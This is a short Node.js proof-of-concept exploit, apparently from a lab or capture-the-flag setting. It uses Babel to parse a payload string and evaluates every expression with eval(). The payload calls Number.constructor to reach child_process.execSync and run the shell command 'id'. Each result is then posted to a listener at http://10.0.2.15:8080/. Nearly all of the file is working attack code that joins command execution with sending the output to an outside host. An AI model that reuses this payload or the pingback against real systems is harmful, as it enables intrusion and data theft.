const babel = require('@babel/core');
const babelTraverse = require('@babel/traverse').default;
const axios = require('axios'); // Import axios for making HTTP requests

// Your source code (malicious code to be evaluated)
const source = `String({ toString: Number.constructor("console.log(process.mainModule.require('child_process').execSync('id').toString())") });`;

const ast = babel.parseSync(source);

// Function to notify the server of the execution result
async function pingBack(result) {
  try {
    await axios.post('http://10.0.2.15:8080/', { result });
    console.log('Pingback sent successfully');
  } catch (error) {
    console.error('Error sending pingback:', error);
  }
}

const evalVisitor = {
  Expression(path) {
    const code = path.toString();
    console.log('Attempting to evaluate expression:', code);

    try {
      const result = eval(code);  // Using eval to run the code
      console.log('Evaluation result:', result);

      // Send the result of the evaluation to your server
      pingBack(result); 
    } catch (error) {
      console.log('Error during eval:', error);
    }
  },
};

babelTraverse(ast, evalVisitor);

